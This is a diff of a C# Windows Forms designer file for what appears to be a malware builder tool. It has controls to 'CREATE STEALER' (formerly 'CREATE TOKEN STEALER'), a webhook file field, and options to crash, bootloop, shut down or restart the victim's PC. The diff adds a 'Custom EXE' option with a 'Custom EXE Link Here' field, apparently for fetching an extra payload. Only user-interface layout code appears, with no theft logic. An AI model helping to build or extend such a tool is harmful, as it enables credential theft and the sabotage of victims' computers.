@@ -38,10 +38,13 @@
             this.SendhookfileTxt = new System.Windows.Forms.TextBox();
             this.CrashPCchkbox = new System.Windows.Forms.CheckBox();
             this.CheckboxPnl = new System.Windows.Forms.Panel();
+            this.CustomEXEchkbox = new System.Windows.Forms.CheckBox();
             this.BootloopPCchckbox = new System.Windows.Forms.CheckBox();
             this.AutoRmvExe = new System.Windows.Forms.CheckBox();
             this.ShutdownPCchkbox = new System.Windows.Forms.CheckBox();
             this.RestartPCchkbox = new System.Windows.Forms.CheckBox();
+            this.panel1 = new System.Windows.Forms.Panel();
+            this.CustomExeTxt = new System.Windows.Forms.TextBox();
             this.roundBtn1 = new RoundBtn();
             this.CreateTokenStealerBtn = new RoundBtn();
             this.CreateSendhookfileBtn = new RoundBtn();
@@ -50,6 +53,7 @@
             this.FinalresbatPnl.SuspendLayout();
             this.SendhookfilePnl.SuspendLayout();
             this.CheckboxPnl.SuspendLayout();
+            this.panel1.SuspendLayout();
             this.SuspendLayout();
             // 
             // RainbowTimer
@@ -194,7 +198,7 @@
             // PnlRainbowDown
             // 
             this.PnlRainbowDown.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(51)))), ((int)(((byte)(51)))), ((int)(((byte)(51)))));
-            this.PnlRainbowDown.Location = new System.Drawing.Point(-1631, 375);
+            this.PnlRainbowDown.Location = new System.Drawing.Point(-1631, 430);
             this.PnlRainbowDown.Name = "PnlRainbowDown";
             this.PnlRainbowDown.Size = new System.Drawing.Size(3814, 2);
             this.PnlRainbowDown.TabIndex = 6307;
@@ -282,15 +286,29 @@
             // CheckboxPnl
             // 
             this.CheckboxPnl.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
+            this.CheckboxPnl.Controls.Add(this.CustomEXEchkbox);
             this.CheckboxPnl.Controls.Add(this.BootloopPCchckbox);
             this.CheckboxPnl.Controls.Add(this.AutoRmvExe);
             this.CheckboxPnl.Controls.Add(this.ShutdownPCchkbox);
             this.CheckboxPnl.Controls.Add(this.RestartPCchkbox);
             this.CheckboxPnl.Controls.Add(this.CrashPCchkbox);
-            this.CheckboxPnl.Location = new System.Drawing.Point(13, 187);
+            this.CheckboxPnl.Location = new System.Drawing.Point(13, 232);
             this.CheckboxPnl.Name = "CheckboxPnl";
-            this.CheckboxPnl.Size = new System.Drawing.Size(252, 119);
+            this.CheckboxPnl.Size = new System.Drawing.Size(252, 121);
             this.CheckboxPnl.TabIndex = 6329;
+            // 
+            // CustomEXEchkbox
+            // 
+            this.CustomEXEchkbox.AccessibleName = "CustomExechkbox";
+            this.CustomEXEchkbox.AutoSize = true;
+            this.CustomEXEchkbox.ForeColor = System.Drawing.SystemColors.Window;
+            this.CustomEXEchkbox.Location = new System.Drawing.Point(148, 77);
+            this.CustomEXEchkbox.Name = "CustomEXEchkbox";
+            this.CustomEXEchkbox.Size = new System.Drawing.Size(85, 17);
+            this.CustomEXEchkbox.TabIndex = 6334;
+            this.CustomEXEchkbox.Text = "Custom EXE";
+            this.CustomEXEchkbox.UseVisualStyleBackColor = true;
+            this.CustomEXEchkbox.CheckedChanged += new System.EventHandler(this.CustomEXEchkbox_CheckedChanged);
             // 
             // BootloopPCchckbox
             // 
@@ -303,6 +321,7 @@
             this.BootloopPCchckbox.TabIndex = 6333;
             this.BootloopPCchckbox.Text = "Bootloop PC";
             this.BootloopPCchckbox.UseVisualStyleBackColor = true;
+            this.BootloopPCchckbox.CheckedChanged += new System.EventHandler(this.BootloopPCchckbox_CheckedChanged);
             // 
             // AutoRmvExe
             // 
@@ -340,6 +359,28 @@
             this.RestartPCchkbox.Text = "Restart PC";
             this.RestartPCchkbox.UseVisualStyleBackColor = true;
             // 
+            // panel1
+            // 
+            this.panel1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
+            this.panel1.Controls.Add(this.CustomExeTxt);
+            this.panel1.Location = new System.Drawing.Point(12, 185);
+            this.panel1.Name = "panel1";
+            this.panel1.Size = new System.Drawing.Size(395, 32);
+            this.panel1.TabIndex = 6331;
+            // 
+            // CustomExeTxt
+            // 
+            this.CustomExeTxt.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(50)))), ((int)(((byte)(55)))));
+            this.CustomExeTxt.BorderStyle = System.Windows.Forms.BorderStyle.None;
+            this.CustomExeTxt.Enabled = false;
+            this.CustomExeTxt.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.CustomExeTxt.ForeColor = System.Drawing.Color.DarkGray;
+            this.CustomExeTxt.Location = new System.Drawing.Point(7, 7);
+            this.CustomExeTxt.Name = "CustomExeTxt";
+            this.CustomExeTxt.Size = new System.Drawing.Size(379, 18);
+            this.CustomExeTxt.TabIndex = 6153;
+            this.CustomExeTxt.Text = "Custom EXE Link Here";
+            // 
             // roundBtn1
             // 
             this.roundBtn1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(105)))), ((int)(((byte)(105)))), ((int)(((byte)(205)))));
@@ -349,8 +390,8 @@
             this.roundBtn1.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
             this.roundBtn1.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
             this.roundBtn1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
-            this.roundBtn1.Font = new System.Drawing.Font("Segoe UI Black", 8.25F, System.Drawing.FontStyle.Bold);
-            this.roundBtn1.Location = new System.Drawing.Point(274, 177);
+            this.roundBtn1.Font = new System.Drawing.Font("Segoe UI Black", 13F, System.Drawing.FontStyle.Bold);
+            this.roundBtn1.Location = new System.Drawing.Point(274, 232);
             this.roundBtn1.Name = "roundBtn1";
             this.roundBtn1.OnHoverBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(88)))), ((int)(((byte)(99)))), ((int)(((byte)(180)))));
             this.roundBtn1.OnHoverButtonColor = System.Drawing.Color.FromArgb(((int)(((byte)(88)))), ((int)(((byte)(99)))), ((int)(((byte)(180)))));
@@ -372,14 +413,14 @@
             this.CreateTokenStealerBtn.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
             this.CreateTokenStealerBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
             this.CreateTokenStealerBtn.Font = new System.Drawing.Font("Segoe UI Black", 8.25F, System.Drawing.FontStyle.Bold);
-            this.CreateTokenStealerBtn.Location = new System.Drawing.Point(249, 330);
+            this.CreateTokenStealerBtn.Location = new System.Drawing.Point(249, 385);
             this.CreateTokenStealerBtn.Name = "CreateTokenStealerBtn";
             this.CreateTokenStealerBtn.OnHoverBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(88)))), ((int)(((byte)(99)))), ((int)(((byte)(180)))));
             this.CreateTokenStealerBtn.OnHoverButtonColor = System.Drawing.Color.FromArgb(((int)(((byte)(88)))), ((int)(((byte)(99)))), ((int)(((byte)(180)))));
             this.CreateTokenStealerBtn.OnHoverTextColor = System.Drawing.Color.White;
             this.CreateTokenStealerBtn.Size = new System.Drawing.Size(158, 27);
             this.CreateTokenStealerBtn.TabIndex = 6326;
-            this.CreateTokenStealerBtn.Text = "CREATE TOKEN STEALER";
+            this.CreateTokenStealerBtn.Text = "CREATE STEALER";
             this.CreateTokenStealerBtn.TextColor = System.Drawing.Color.White;
             this.CreateTokenStealerBtn.UseVisualStyleBackColor = true;
             this.CreateTokenStealerBtn.Click += new System.EventHandler(this.roundBtn1_Click);
@@ -394,7 +435,7 @@
             this.CreateSendhookfileBtn.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
             this.CreateSendhookfileBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
             this.CreateSendhookfileBtn.Font = new System.Drawing.Font("Segoe UI Black", 8.25F, System.Drawing.FontStyle.Bold);
-            this.CreateSendhookfileBtn.Location = new System.Drawing.Point(12, 330);
+            this.CreateSendhookfileBtn.Location = new System.Drawing.Point(12, 385);
             this.CreateSendhookfileBtn.Name = "CreateSendhookfileBtn";
             this.CreateSendhookfileBtn.OnHoverBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(88)))), ((int)(((byte)(99)))), ((int)(((byte)(180)))));
             this.CreateSendhookfileBtn.OnHoverButtonColor = System.Drawing.Color.FromArgb(((int)(((byte)(88)))), ((int)(((byte)(99)))), ((int)(((byte)(180)))));
@@ -411,7 +452,8 @@
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
             this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
-            this.ClientSize = new System.Drawing.Size(421, 389);
+            this.ClientSize = new System.Drawing.Size(421, 444);
+            this.Controls.Add(this.panel1);
             this.Controls.Add(this.roundBtn1);
             this.Controls.Add(this.CheckboxPnl);
             this.Controls.Add(this.CreateTokenStealerBtn);
@@ -437,6 +479,8 @@
             this.SendhookfilePnl.PerformLayout();
             this.CheckboxPnl.ResumeLayout(false);
             this.CheckboxPnl.PerformLayout();
+            this.panel1.ResumeLayout(false);
+            this.panel1.PerformLayout();
             this.ResumeLayout(false);
 
         }
@@ -488,5 +532,8 @@
         private System.Windows.Forms.CheckBox BootloopPCchckbox;
         private System.Windows.Forms.CheckBox AutoRmvExe;
         private System.Windows.Forms.CheckBox ShutdownPCchkbox;
+        private System.Windows.Forms.CheckBox CustomEXEchkbox;
+        private System.Windows.Forms.Panel panel1;
+        private System.Windows.Forms.TextBox CustomExeTxt;
     }
 }
